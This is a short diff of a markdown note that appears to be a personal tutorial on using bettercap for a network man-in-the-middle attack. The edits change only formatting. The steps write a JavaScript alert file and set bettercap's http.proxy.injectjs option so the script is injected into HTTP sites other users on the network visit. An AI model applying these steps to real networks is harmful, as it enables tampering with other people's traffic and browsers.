@@ -168,27 +168,32 @@ Now we can Monitor all the traffics. **(Lets search any http site like aitindia.
 
 ![[Pasted image 20260101220927.png]]
 
-First,
+#### First,
 make a .js file 
 
 ```
 alert("You are hacked");
 ```
 
-Next,
+#### Next,
 
-use http.proxy option in bettercap
+**use http.proxy option in bettercap**
 
-Next,
+#### Next,
 
-Turn on http.proxy on
+**Turn on http.proxy on**
 
-Next,
+#### Next,
 
+```
 help  http.proxy
+```
 
 use  http.proxy.injectjs option
 
+```
 set  http.proxy.injectjs /home/ranger/alert.js (File Path)
+```
 
 
+##### Now visit any **http** website
